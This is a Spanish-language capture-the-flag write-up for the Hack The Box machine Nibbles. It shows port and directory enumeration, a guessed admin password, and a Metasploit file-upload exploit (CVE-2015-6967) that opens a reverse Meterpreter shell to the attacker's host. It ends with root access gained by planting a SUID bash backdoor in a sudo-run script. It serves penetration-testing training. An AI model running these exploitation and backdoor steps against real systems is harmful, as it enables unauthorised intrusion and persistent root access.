# Enumeration

>Realizamos un escaneo de puertos TCP con mi herramienta automatizada de escaneo:

```bash
┌──(kali㉿jbkira)-[~]
└─$ sudo AutoNmap.sh 10.129.96.84                                                      
AutoNmap By JBKira
Puertos TCP abiertos:
22,80
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Site doesn't have a title (text/html).
```

>Revisamos las tecnologías que emplea el servicio web alojado en el puerto 80, pero no vemos nada interesante, solo la versión de Apache y que se trata de un Ubuntu:

```bash
┌──(kali㉿jbkira)-[~]
└─$ whatweb http://10.129.96.84                                                                 
http://10.129.96.84 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.96.84]

```

>Si accedemos a la página principal solo vemos un hello world pero cuando vemos el código fuente vemos que hay un comentario que nos dice que vayamos a un directorio en concreto:

```html
<b>Hello world!</b>

<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

>Si accedemos a ese directorio podemos ver que está empleando el CMS Nibbleblog, el cual posee diversas vulnerabilidades:

![image](https://github.com/user-attachments/assets/688b13f7-e72c-4342-9e73-288f94603627)

>Vamos a hacer fuzzing para ver que directorios podemos encontrar aquí:

```bash
┌──(kali㉿jbkira)-[~]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt:FUZZ -u http://10.129.96.84/nibbleblog/FUZZ -c           

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.96.84/nibbleblog/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

content                 [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 64ms]
themes                  [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 63ms]
admin                   [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 63ms]
plugins                 [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 64ms]
README                  [Status: 200, Size: 4628, Words: 589, Lines: 64, Duration: 66ms]
languages               [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 65ms]
```

>Si vamos al directorio content podemos enumerar un usuario en el siguiente archivo: http://10.129.96.84/nibbleblog/content/private/users.xml cabe destacar que el directory listing está habilitado en el servidor

```xml
<users>
<user username="admin">
<id type="integer">0</id>
<session_fail_count type="integer">0</session_fail_count>
<session_date type="integer">1514544131</session_date>
</user>
<blacklist type="string" ip="10.10.10.1">
<date type="integer">1512964659</date>
<fail_count type="integer">1</fail_count>
</blacklist>
</users>
```

>Podemos ver la versión de NibbleBlog en http://10.129.96.84/nibbleblog/README

```
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01
```

>Esta versión es vulnerable a Arbitrary File Upload aunque para ello necesitamos las credenciales de un usuario.

>Podríamos probar a logguearnos empleando como contraseña del usuario admin nibbles ya que es el nombre de la máquina y se menciona en muchos lugares, asi que nos dirigimos a admin.php y lo probamos:

![image](https://github.com/user-attachments/assets/8acc452f-df61-4429-b3e3-629ea669be86)

>Las credenciales son válidas así que ya podemos emplear un módulo de metasploit para explotar la vulnerabilidad anteriormente mencionada (CVE-2015-6967):

```bash
msf6 exploit(multi/http/nibbleblog_file_upload) > set LHOST 10.10.14.133
LHOST => 10.10.14.133
msf6 exploit(multi/http/nibbleblog_file_upload) > set LPORT 443
LPORT => 443
msf6 exploit(multi/http/nibbleblog_file_upload) > set USER
set USERAGENT  set USERNAME   
msf6 exploit(multi/http/nibbleblog_file_upload) > set USERNAME admin
USERNAME => admin
msf6 exploit(multi/http/nibbleblog_file_upload) > set PASSWORD nibbles
PASSWORD => nibbles
msf6 exploit(multi/http/nibbleblog_file_upload) > set RHOSTS 10.129.96.84
RHOSTS => 10.129.96.84
msf6 exploit(multi/http/nibbleblog_file_upload) > set TARGETURI /nibbleblog/
TARGETURI => /nibbleblog/
msf6 exploit(multi/http/nibbleblog_file_upload) > run
[*] Started reverse TCP handler on 10.10.14.133:443 
[*] Sending stage (40004 bytes) to 10.129.96.84
[+] Deleted image.php
[*] Meterpreter session 1 opened (10.10.14.133:443 -> 10.129.96.84:59542) at 2025-04-19 15:25:21 -0400

meterpreter > getuid
Server username: nibbler
```

# Privilege Escalation

>Si listamos los permisos de sudo podemos ver que puede lanzar un script monitor.sh como root:

```bash
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ sudo -l
-ldo  
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

>En su directorio personal podemos ver la flag user.txt y un archivo zip que parece contener el script que se menciona en el sudoers:

```bash
nibbler@Nibbles:/home/nibbler$ ls
ls
personal.zip  user.txt
```

>Lo descomprimimos:

```bash
nibbler@Nibbles:/home/nibbler$ unzip personal.zip
unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh
```

>Ahora podemos analizar el contenido de monitor.sh:

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ cat monitor.sh
cat monitor.sh
                  ####################################################################################################
                  #                                        Tecmint_monitor.sh                                        #
                  # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #
                  # If any bug, report us in the link below                                                          #
                  # Free to use/edit/distribute the code below by                                                    #
                  # giving proper credit to Tecmint.com and Author                                                   #
                  #                                                                                                  #
                  ####################################################################################################
#! /bin/bash
# unset any variable which system may be using

# clear the screen
clear

unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

while getopts iv name
do
        case $name in
          i)iopt=1;;
          v)vopt=1;;
          *)echo "Invalid arg";;
        esac
done

if [[ ! -z $iopt ]]
then
{
wd=$(pwd)
basename "$(test -L "$0" && readlink "$0" || echo "$0")" > /tmp/scriptname
scriptname=$(echo -e -n $wd/ && cat /tmp/scriptname)
su -c "cp $scriptname /usr/bin/monitor" root && echo "Congratulations! Script Installed, now run monitor Command" || echo "Installation failed"
}
fi

if [[ ! -z $vopt ]]
then
{
echo -e "tecmint_monitor version 0.1\nDesigned by Tecmint.com\nReleased Under Apache 2.0 License"
}
fi

if [[ $# -eq 0 ]]
then
{


# Define Variable tecreset
tecreset=$(tput sgr0)

# Check if connected to Internet or not
ping -c 1 google.com &> /dev/null && echo -e '\E[32m'"Internet: $tecreset Connected" || echo -e '\E[32m'"Internet: $tecreset Disconnected"

# Check OS Type
os=$(uname -o)
echo -e '\E[32m'"Operating System Type :" $tecreset $os

# Check OS Release Version and Name
cat /etc/os-release | grep 'NAME\|VERSION' | grep -v 'VERSION_ID' | grep -v 'PRETTY_NAME' > /tmp/osrelease
echo -n -e '\E[32m'"OS Name :" $tecreset  && cat /tmp/osrelease | grep -v "VERSION" | cut -f2 -d\"
echo -n -e '\E[32m'"OS Version :" $tecreset && cat /tmp/osrelease | grep -v "NAME" | cut -f2 -d\"

# Check Architecture
architecture=$(uname -m)
echo -e '\E[32m'"Architecture :" $tecreset $architecture

# Check Kernel Release
kernelrelease=$(uname -r)
echo -e '\E[32m'"Kernel Release :" $tecreset $kernelrelease

# Check hostname
echo -e '\E[32m'"Hostname :" $tecreset $HOSTNAME

# Check Internal IP
internalip=$(hostname -I)
echo -e '\E[32m'"Internal IP :" $tecreset $internalip

# Check External IP
externalip=$(curl -s ipecho.net/plain;echo)
echo -e '\E[32m'"External IP : $tecreset "$externalip

# Check DNS
nameservers=$(cat /etc/resolv.conf | sed '1 d' | awk '{print $2}')
echo -e '\E[32m'"Name Servers :" $tecreset $nameservers 

# Check Logged In Users
who>/tmp/who
echo -e '\E[32m'"Logged In users :" $tecreset && cat /tmp/who 

# Check RAM and SWAP Usages
free -h | grep -v + > /tmp/ramcache
echo -e '\E[32m'"Ram Usages :" $tecreset
cat /tmp/ramcache | grep -v "Swap"
echo -e '\E[32m'"Swap Usages :" $tecreset
cat /tmp/ramcache | grep -v "Mem"

# Check Disk Usages
df -h| grep 'Filesystem\|/dev/sda*' > /tmp/diskusage
echo -e '\E[32m'"Disk Usages :" $tecreset 
cat /tmp/diskusage

# Check Load Average
loadaverage=$(top -n 1 -b | grep "load average:" | awk '{print $10 $11 $12}')
echo -e '\E[32m'"Load Average :" $tecreset $loadaverage

# Check System Uptime
tecuptime=$(uptime | awk '{print $3,$4}' | cut -f1 -d,)
echo -e '\E[32m'"System Uptime Days/(HH:MM) :" $tecreset $tecuptime

# Unset Variables
unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

# Remove Temporary Files
rm /tmp/osrelease /tmp/who /tmp/ramcache /tmp/diskusage
}
fi
shift $(($OPTIND -1))
```

>Como tenemos permisos de escritura realmente con escribir un backdoor como el siguiente y lanzar el script con sudo podríamos obtener persistencia y una shell como root:

```bash
chmod u+s /bin/bash
bash -p
```

>Ejecutamos el script y ganamos una shell como root:

```bash
nibbler@Nibbles:/$ sudo /home/nibbler/personal/stuff/monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
root@Nibbles:/# whoami
root
```

>Vemos la flag root.txt aquí:

```bash
root@Nibbles:/# ls /root
root.txt
```
